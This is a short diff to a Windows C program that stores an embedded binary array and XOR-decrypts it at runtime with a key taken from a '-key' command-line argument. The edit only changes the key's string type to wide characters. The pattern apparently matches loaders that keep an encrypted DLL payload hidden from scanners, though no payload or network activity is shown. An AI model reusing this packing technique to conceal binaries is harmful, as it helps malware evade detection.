@@ -149,9 +149,9 @@ uint8_t binary[] = {
 };
 
 #if DECRYPT_DLL
-VOID decryptBinary(PCSTR key)
+VOID decryptBinary(LPWSTR key)
 {
-    SIZE_T keyLenth = strlen(key);
+    SIZE_T keyLenth = wcslen(key);
 
     for (int i = 0; i < sizeof(binary); i++)
         binary[i] ^= key[i % keyLenth];
@@ -249,7 +249,7 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
 #if DECRYPT_DLL
     INT argc;
-    PCWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
+    LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
 
     for (INT i = 1; i < argc; i++) {
         if (!lstrcmpW(argv[i], L"-key")) {
